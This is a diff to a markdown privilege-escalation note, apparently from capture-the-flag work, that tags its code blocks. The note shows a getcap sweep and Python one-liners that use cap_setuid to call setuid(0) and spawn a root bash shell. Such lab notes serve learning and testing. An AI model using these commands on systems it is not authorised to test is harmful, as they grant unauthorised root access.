@@ -20,6 +20,7 @@ The kernel checks file capabilities on `execve`. If the binary has `cap_setuid` 
 ## Steps
 
 ### 1. Sweep the filesystem
+<!-- cmd: linux -->
 ```bash
 getcap -r / 2>/dev/null
 ```
@@ -33,6 +34,7 @@ What you're looking for:
 ### 2. Pop a root shell
 
 Python, single line, works on any version with `cap_setuid+ep`:
+<!-- cmd: linux -->
 ```bash
 /usr/bin/python3.7 -c 'import os; os.setuid(0); import pty; pty.spawn("/bin/bash")'
 ```
@@ -43,6 +45,7 @@ Used on: **ohmyweb**
 - A shell launched via `subprocess` invokes `sh -c <arg>` and bash drops privileges when EUID != UID without `-p`. `pty.spawn("/bin/bash")` does not.
 
 If `pty` is unavailable, the equivalent that survives almost any environment uses `os.execl` to keep EUID=0:
+<!-- cmd: linux -->
 ```bash
 /usr/bin/python3.7 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
 ```
